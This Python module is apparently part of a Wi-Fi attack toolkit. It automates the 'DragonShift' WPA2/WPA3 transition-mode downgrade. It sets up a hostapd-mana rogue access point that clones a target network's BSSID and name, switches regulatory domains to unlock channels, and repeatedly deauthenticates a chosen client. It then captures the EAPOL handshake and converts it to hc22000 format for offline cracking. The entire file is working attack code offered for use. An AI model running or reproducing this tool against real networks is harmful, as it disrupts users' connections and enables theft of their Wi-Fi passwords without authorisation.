"""DragonShift attack: WPA2/WPA3 transition-mode downgrade.
Uses hostapd-mana (rogue AP) + deauth + capture on two interfaces.

hostapd-mana stdout is parsed for association/client events.
airodump-ng uses ncurses output -> tracked via pcap size."""
from __future__ import annotations

import json
import os
import re
import subprocess
import tempfile
import time
from datetime import datetime, timezone
from pathlib import Path

from _log_util import drain_stdout, log, run_deauth_burst, strip_ansi, ToolOutputLogger

STATUS_INTERVAL = 10

HOSTAPD_IMPORTANT_RE = [
    re.compile(r"associated", re.I),
    re.compile(r"MANA", re.I),
    re.compile(r"WPA", re.I),
    re.compile(r"client", re.I),
    re.compile(r"deauth", re.I),
    re.compile(r"station", re.I),
]


def _is_stop_requested() -> bool:
    from attack_runner import is_stop_requested
    return is_stop_requested()


def run(config: dict, data_dir: Path) -> None:
    bssid = config["bssid"]
    essid = config.get("essid") or "DragonShift"
    channel = config["channel"]
    iface_ap = config.get("iface_ap") or config.get("interface2", "")
    iface_mon = config.get("iface_mon") or config.get("interface", "")
    client_mac = config.get("client_mac")
    timeout = config.get("timeout", 300)
    deauth_interval = config.get("deauth_interval", 30)
    deauth_count = int(config.get("deauth_count") or 10)

    log_path = data_dir / "log.txt"
    capture_prefix = str(data_dir / "capture")
    hc22000 = data_dir / "dragonshift.hc22000"
    hs_pcap = data_dir / "handshake.pcap"
    mana_hs_pcap = data_dir / "mana_handshake.pcap"

    log(log_path, "=== DragonShift (WPA2/WPA3 Downgrade) ===")
    log(log_path, f"bssid:      {bssid}")
    log(log_path, f"essid:      {essid}")
    log(log_path, f"channel:    {channel}")
    log(log_path, f"AP iface:   {iface_ap}")
    log(log_path, f"Mon iface:  {iface_mon}")
    log(log_path, f"client:     {client_mac or '(not set)'}")
    log(log_path, f"timeout:    {timeout}s, deauth every {deauth_interval}s x{deauth_count}")

    if not iface_ap:
        log(log_path, "ERROR: AP interface not configured - select it in job config")
        raise RuntimeError("DragonShift requires an AP interface for the rogue AP")

    if not client_mac:
        log(log_path, "ERROR: target client not selected - DragonShift requires a specific client for targeted deauthentication")
        raise RuntimeError("DragonShift requires a target client MAC - select one in job config")

    _prep_iface_for_hostapd(iface_ap, channel, log_path)

    hostapd_conf = _generate_hostapd_config(essid, channel, iface_ap, bssid)
    dfs_tag = " [DFS]" if channel in range(52, 145) else ""
    log(log_path, f"hostapd config: iface={iface_ap}, ssid={essid}, bssid={bssid}, ch={channel}{dfs_tag}, hw_mode={'a' if channel > 14 else 'g'}")
    _update_status(data_dir, "running", "starting hostapd-mana rogue AP")

    log(log_path, f"starting hostapd-mana on {iface_ap}")
    hostapd_proc = subprocess.Popen(
        ["hostapd-mana", hostapd_conf],
        stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True,
    )
    hostapd_tl = ToolOutputLogger(log_path, prefix="hostapd> ")

    dfs = _is_dfs_channel(channel)
    startup_polls = 180 if dfs else 10
    if dfs:
        log(log_path, f"DFS channel - waiting up to {startup_polls // 2}s for CAC")
    _update_status(data_dir, "running",
                   "DFS CAC in progress (up to 90s)..." if dfs else "starting hostapd-mana")

    hostapd_all_output: list[str] = []

    def _drain_and_collect() -> None:
        drain_stdout(hostapd_proc, hostapd_tl, HOSTAPD_IMPORTANT_RE)
        if hostapd_tl.last_status:
            hostapd_all_output.append(hostapd_tl.last_status)

    ap_started = False
    for i in range(startup_polls):
        time.sleep(0.5)
        _drain_and_collect()
        if hostapd_proc.poll() is not None:
            break
        joined = " ".join(hostapd_all_output)
        if "AP-ENABLED" in joined:
            ap_started = True
            break
        if _is_stop_requested():
            hostapd_proc.terminate()
            log(log_path, "stop requested during CAC - aborting")
            raise RuntimeError("stopped during DFS CAC")
        if dfs and i % 20 == 19:
            log(log_path, f"  CAC waiting... ({(i+1)//2}s)")

    _drain_and_collect()

    if hostapd_proc.poll() is not None:
        rc = hostapd_proc.returncode
        full_log = log_path.read_text() if log_path.exists() else ""
        hint = ""
        if rc == 1:
            if "start_dfs_cac" in full_log:
                hint = (" (DFS CAC failed - the WiFi adapter does not support"
                         " radar detection on this channel. DFS channels 52-144"
                         " require enterprise-grade hardware. Use a non-DFS"
                         " channel: 36-48 or 149-165 for 5 GHz)")
            elif "not found from the channel list" in full_log:
                hint = (" (channel not available - the adapter or regulatory"
                         " domain does not allow this channel for AP mode)")
            else:
                hint = " (check log - channel/band mismatch or DFS restriction)"
        elif rc == -9:
            hint = " (SIGKILL - interface likely still in monitor mode)"
        elif rc == -11:
            hint = " (SIGSEGV - hostapd-mana crashed)"
        log(log_path, f"ERROR: hostapd-mana exited (code={rc}){hint}")
        raise RuntimeError(f"hostapd-mana failed to start (code={rc}){hint}")

    verified_ap = _verify_rogue_ap(
        iface=iface_ap,
        channel=channel,
        essid=essid,
        expected_bssid=bssid,
        log_path=log_path,
    )
    startup_note = " (AP-ENABLED, CAC OK)" if dfs and ap_started else ""
    if not ap_started:
        startup_note += " (verified via iw)"
    log(log_path, "hostapd-mana running" + startup_note)
    log(
        log_path,
        "rogue AP params: "
        f"iface={iface_ap}, ssid={essid}, "
        f"bssid={verified_ap.get('addr') or bssid}, "
        f"type={verified_ap.get('type') or '?'}, "
        f"ch={verified_ap.get('channel') or '?'}, "
        f"freq={verified_ap.get('freq_mhz') or '?'} MHz, "
        f"txpower={verified_ap.get('txpower') or '?'}",
    )

    airodump_cmd = [
        "airodump-ng",
        "--bssid", bssid,
        "-c", str(channel),
        "-w", capture_prefix,
        "--output-format", "pcap",
        iface_mon,
    ]
    log(log_path, f"exec: {' '.join(airodump_cmd)}")
    _update_status(data_dir, "running", "starting airodump-ng capture")
    airodump_proc = subprocess.Popen(airodump_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    start = time.time()
    last_deauth = 0.0
    last_status_time = 0.0
    deauth_total = 0
    stopped = False
    prev_cap_size = 0

    try:
        while time.time() - start < timeout:
            if _is_stop_requested():
                stopped = True
                log(log_path, "stop requested - finishing")
                break

            drain_stdout(hostapd_proc, hostapd_tl, HOSTAPD_IMPORTANT_RE)

            elapsed = time.time() - start
            if elapsed - last_deauth >= deauth_interval:
                burst = run_deauth_burst(
                    log_path, iface_mon, bssid, deauth_count, client_mac
                )
                deauth_total += burst
                log(log_path, f"deauth interval done (+{burst} frames, cumulative: {deauth_total})")
                _update_status(data_dir, "running", f"DragonShift ({int(elapsed)}s)")
                last_deauth = elapsed

            if airodump_proc.poll() is not None:
                log(log_path, f"airodump-ng exited (code={airodump_proc.returncode})")
                break

            if elapsed - last_status_time >= STATUS_INTERVAL:
                cap_file = _find_cap_file(data_dir)
                cap_size = cap_file.stat().st_size if cap_file else 0
                growth = cap_size - prev_cap_size
                log(log_path, f"  pcap: {cap_size:,} bytes (+{growth:,}), deauths: {deauth_total}")
                prev_cap_size = cap_size
                last_status_time = elapsed
            time.sleep(2)
    finally:
        for p in (airodump_proc, hostapd_proc):
            p.terminate()
            try:
                p.wait(timeout=10)
            except subprocess.TimeoutExpired:
                p.kill()
        log(log_path, f"processes stopped (hostapd={hostapd_proc.returncode}, airodump={airodump_proc.returncode})")

    log(log_path, "--- Post-processing ---")
    cap_file = _find_cap_file(data_dir)
    hs_found = False

    if cap_file:
        cap_size = cap_file.stat().st_size
        log(log_path, f"capture file: {cap_file.name} ({cap_size:,} bytes)")

        _update_status(data_dir, "running", "filtering handshake")
        tshark_cmd = [
            "tshark", "-nr", str(cap_file),
            "-Y", f"eapol && wlan.addr == {bssid}",
            "-w", str(hs_pcap),
            "-F", "pcap",
        ]
        log(log_path, f"exec: {' '.join(tshark_cmd)}")
        try:
            r = subprocess.run(tshark_cmd, capture_output=True, text=True, timeout=60)
            if r.returncode != 0:
                log(log_path, f"tshark exited with code {r.returncode}")
            if r.stderr.strip():
                for line in r.stderr.strip().splitlines()[:5]:
                    log(log_path, f"  tshark> {strip_ansi(line)[:200]}")
        except subprocess.TimeoutExpired:
            log(log_path, "tshark timed out")

        _update_status(data_dir, "running", "converting to hc22000")
        hcx_cmd = ["hcxpcapngtool", "-o", str(hc22000), str(cap_file)]
        r = subprocess.run(hcx_cmd, capture_output=True, text=True, timeout=60)
        if r.returncode != 0:
            log(log_path, f"hcxpcapngtool exited with code {r.returncode}")
        if r.stdout.strip():
            for line in r.stdout.strip().splitlines()[:5]:
                log(log_path, f"  hcxpcapngtool> {strip_ansi(line)[:200]}")
        hs_found = hc22000.exists() and hc22000.stat().st_size > 0

        if hs_found:
            log(log_path, f"hc22000 created ({hc22000.stat().st_size:,} bytes) - HANDSHAKE CAPTURED")
        else:
            log(log_path, "no WPA2 handshake material in capture, checking mana_handshake.pcap")
            if mana_hs_pcap.exists() and mana_hs_pcap.stat().st_size > 0:
                log(log_path, f"trying hostapd-mana capture: {mana_hs_pcap.name} ({mana_hs_pcap.stat().st_size:,} bytes)")
                mana_hcx_cmd = ["hcxpcapngtool", "-o", str(hc22000), str(mana_hs_pcap)]
                r = subprocess.run(mana_hcx_cmd, capture_output=True, text=True, timeout=60)
                if r.returncode != 0:
                    log(log_path, f"hcxpcapngtool (mana capture) exited with code {r.returncode}")
                if r.stdout.strip():
                    for line in r.stdout.strip().splitlines()[:5]:
                        log(log_path, f"  hcxpcapngtool(mana)> {strip_ansi(line)[:200]}")
                hs_found = hc22000.exists() and hc22000.stat().st_size > 0
                if hs_found:
                    log(log_path, f"hc22000 created from mana capture ({hc22000.stat().st_size:,} bytes)")
                else:
                    log(log_path, "no WPA2 handshake material in mana capture")
            else:
                log(log_path, "mana_handshake.pcap not found or empty")
    else:
        log(log_path, "no capture file - skipping post-processing")

    duration = round(time.time() - start, 1)
    status_msg = "HANDSHAKE CAPTURED" if hs_found else "no handshake"
    log(log_path, f"=== Result: {status_msg} | {duration}s | deauths: {deauth_total} ===")

    result = {
        "bssid": bssid,
        "essid": essid,
        "handshake_found": hs_found,
        "capture_file": str(cap_file) if cap_file else None,
        "handshake_pcap": str(hs_pcap) if hs_pcap.exists() else None,
        "hc22000": str(hc22000) if hc22000.exists() else None,
        "stopped_early": stopped,
        "duration_s": duration,
    }
    (data_dir / "result.json").write_text(json.dumps(result, indent=2))

    try:
        os.unlink(hostapd_conf)
    except OSError:
        pass


_REGDOMAIN_CANDIDATES = ["US", "GB", "DE", "JP", "00"]


def _get_phy_for_iface(iface: str) -> str | None:
    """Return phyX name for an interface, e.g. 'phy1'."""
    try:
        r = subprocess.run(["iw", "dev", iface, "info"],
                           capture_output=True, text=True, timeout=5)
        for line in r.stdout.splitlines():
            if "wiphy" in line.lower():
                return "phy" + line.strip().split()[-1]
    except Exception:
        pass
    return None


def _channel_to_freq(channel: int) -> int | None:
    if 1 <= channel <= 14:
        return 2484 if channel == 14 else 2407 + channel * 5
    if 36 <= channel <= 177:
        return 5000 + channel * 5
    return None


def _is_dfs_channel(channel: int) -> bool:
    return 52 <= channel <= 144


def _is_channel_available(iface: str, channel: int) -> bool:
    """Check if channel is enabled (not disabled) on the adapter's phy."""
    phy = _get_phy_for_iface(iface)
    if not phy:
        return True
    freq = _channel_to_freq(channel)
    if not freq:
        return True
    try:
        r = subprocess.run(["iw", phy, "info"],
                           capture_output=True, text=True, timeout=5)
        for line in r.stdout.splitlines():
            if str(freq) in line and f"[{channel}]" in line:
                return "(disabled)" not in line
    except Exception:
        pass
    return False


def _get_current_regdomain() -> str:
    """Read current regulatory domain from `iw reg get`."""
    try:
        r = subprocess.run(["iw", "reg", "get"],
                           capture_output=True, text=True, timeout=5)
        for line in r.stdout.splitlines():
            m = re.search(r"country\s+([A-Z0-9]{2})", line)
            if m:
                return m.group(1)
    except Exception:
        pass
    return ""


def _recycle_iface(iface: str) -> None:
    """Down/up cycle to refresh driver channel list after regdomain change."""
    subprocess.run(["ip", "link", "set", iface, "down"],
                   capture_output=True, timeout=5)
    time.sleep(0.3)
    subprocess.run(["ip", "link", "set", iface, "up"],
                   capture_output=True, timeout=5)
    time.sleep(0.3)


def _prep_iface_for_hostapd(iface: str, channel: int, log_path: Path) -> None:
    """Prepare the AP interface for hostapd-mana.

    1. Kill interfering processes.
    2. Switch interface to managed mode (hostapd needs it).
    3. Check if the target channel is available.
    4. If disabled - automatically try regulatory domains until it works.
    """
    try:
        subprocess.run(["airmon-ng", "check", "kill"],
                       capture_output=True, timeout=10)
        log(log_path, "  airmon-ng check kill - OK")
    except Exception:
        pass

    try:
        subprocess.run(["ip", "link", "set", iface, "down"],
                       capture_output=True, timeout=5)
        time.sleep(0.3)
        r = subprocess.run(["iw", "dev", iface, "info"],
                           capture_output=True, text=True, timeout=5)
        if "type monitor" in r.stdout.lower():
            subprocess.run(["iw", "dev", iface, "set", "type", "managed"],
                           capture_output=True, timeout=5)
            log(log_path, f"  {iface} switched to managed mode")
        else:
            log(log_path, f"  {iface} mode: managed")
        subprocess.run(["ip", "link", "set", iface, "up"],
                       capture_output=True, timeout=5)
        time.sleep(0.3)
    except Exception as e:
        log(log_path, f"  warning: could not prepare {iface}: {e}")

    if _is_channel_available(iface, channel):
        freq = _channel_to_freq(channel) or "?"
        log(log_path, f"  channel {channel} ({freq} MHz) - available, no regdomain change needed")
        _log_channel_status(iface, channel, log_path)
        return

    log(log_path, f"  channel {channel} is disabled - searching for a suitable regulatory domain")
    current = _get_current_regdomain()
    log(log_path, f"  current regdomain: {current or '(unset)'}")

    for domain in _REGDOMAIN_CANDIDATES:
        if domain == current:
            continue
        log(log_path, f"  trying regdomain {domain}...")
        subprocess.run(["iw", "reg", "set", domain],
                       capture_output=True, timeout=5)
        time.sleep(0.5)
        _recycle_iface(iface)

        if _is_channel_available(iface, channel):
            log(log_path, f"  channel {channel} enabled with regdomain {domain}")
            _log_channel_status(iface, channel, log_path)
            return

    log(log_path, f"  WARNING: channel {channel} still disabled after trying all domains")
    _log_channel_status(iface, channel, log_path)


def _log_channel_status(iface: str, channel: int, log_path: Path) -> None:
    """Log the phy's view of the target channel for diagnostics."""
    phy = _get_phy_for_iface(iface)
    freq = _channel_to_freq(channel)
    if not phy or not freq:
        return
    try:
        r = subprocess.run(["iw", phy, "info"],
                           capture_output=True, text=True, timeout=5)
        for line in r.stdout.splitlines():
            if str(freq) in line and f"[{channel}]" in line:
                log(log_path, f"  {phy}: {line.strip()}")
                return
        log(log_path, f"  {phy}: channel {channel} ({freq} MHz) not found in phy info")
    except Exception:
        pass


def _read_iface_runtime_params(iface: str) -> dict[str, str]:
    """Read runtime interface parameters from `iw dev <iface> info`."""
    params: dict[str, str] = {
        "addr": "",
        "type": "",
        "channel": "",
        "freq_mhz": "",
        "txpower": "",
    }
    try:
        r = subprocess.run(["iw", "dev", iface, "info"],
                           capture_output=True, text=True, timeout=5)
        if r.returncode != 0:
            return params
        for raw_line in r.stdout.splitlines():
            line = raw_line.strip()
            if line.startswith("addr "):
                params["addr"] = line.split(maxsplit=1)[1]
            elif line.startswith("type "):
                params["type"] = line.split(maxsplit=1)[1]
            elif line.startswith("txpower "):
                params["txpower"] = line.split(maxsplit=1)[1]
            elif line.startswith("channel "):
                m = re.search(r"channel\s+(\d+)\s+\((\d+)\s+MHz\)", line)
                if m:
                    params["channel"] = m.group(1)
                    params["freq_mhz"] = m.group(2)
    except Exception:
        pass
    return params


def _verify_rogue_ap(
    iface: str,
    channel: int,
    essid: str,
    expected_bssid: str | None,
    log_path: Path,
) -> dict[str, str]:
    """Verify rogue AP is actually up and attached to the expected channel."""
    expected_channel = str(channel)
    expected_bssid_l = (expected_bssid or "").lower()
    last_seen: dict[str, str] = {}
    for _ in range(12):
        params = _read_iface_runtime_params(iface)
        last_seen = params
        type_ok = params.get("type", "").lower() == "ap"
        channel_ok = params.get("channel") == expected_channel
        addr_now = params.get("addr", "").lower()
        bssid_ok = not expected_bssid_l or addr_now == expected_bssid_l
        if type_ok and channel_ok and bssid_ok:
            log(
                log_path,
                "rogue AP verification: OK "
                f"(iface={iface}, type={params.get('type')}, "
                f"channel={params.get('channel')}, ssid={essid})",
            )
            return params
        time.sleep(0.5)

    observed = (
        f"type={last_seen.get('type') or '?'} "
        f"channel={last_seen.get('channel') or '?'} "
        f"bssid={last_seen.get('addr') or '?'}"
    )
    expected = (
        f"type=AP channel={expected_channel} "
        f"bssid={expected_bssid or '(not set)'}"
    )
    log(log_path, f"ERROR: rogue AP verification failed ({observed}; expected {expected})")
    raise RuntimeError(f"rogue AP not confirmed on {iface}; expected {expected}")


def _generate_hostapd_config(essid: str, channel: int, iface: str,
                              bssid: str | None = None) -> str:
    """Generate hostapd-mana config.

    Follows the minimal approach from reference dragonshift.sh:
    no country_code/ieee80211d for non-DFS channels.
    DFS channels (52-144) require country_code + ieee80211d + ieee80211h
    so hostapd can perform DFS CAC.
    """
    is_5ghz = channel > 14
    lines = [
        f"interface={iface}",
        "driver=nl80211",
        f"hw_mode={'a' if is_5ghz else 'g'}",
        f"channel={channel}",
        f"ssid={essid}",
    ]
    if bssid:
        lines.append(f"bssid={bssid}")

    if _is_dfs_channel(channel):
        reg = _get_current_regdomain() or "US"
        lines += [
            f"country_code={reg}",
            "ieee80211d=1",
            "ieee80211h=1",
        ]

    lines += [
        "wpa=2",
        "wpa_key_mgmt=WPA-PSK",
        "wpa_pairwise=CCMP",
        "rsn_pairwise=CCMP",
        "wpa_passphrase=12345678",
        "mana_wpaout=/data/attack/mana_handshake.pcap",
    ]
    conf = "\n".join(lines) + "\n"
    fd, path = tempfile.mkstemp(suffix=".conf", prefix="hostapd_mana_")
    os.write(fd, conf.encode())
    os.close(fd)
    return path


def _find_cap_file(data_dir: Path) -> Path | None:
    for ext in ("*.cap", "*.pcap", "*.pcapng"):
        caps = sorted(data_dir.glob(f"capture*{ext[1:]}"))
        if caps:
            return caps[-1]
    return None


def _update_status(data_dir: Path, status: str, progress: str) -> None:
    payload = {
        "status": status,
        "progress": progress,
        "started_at": os.environ.get("_RUNNER_STARTED_AT", ""),
        "updated_at": datetime.now(timezone.utc).isoformat(),
    }
    (data_dir / "status.json").write_text(json.dumps(payload, indent=2))
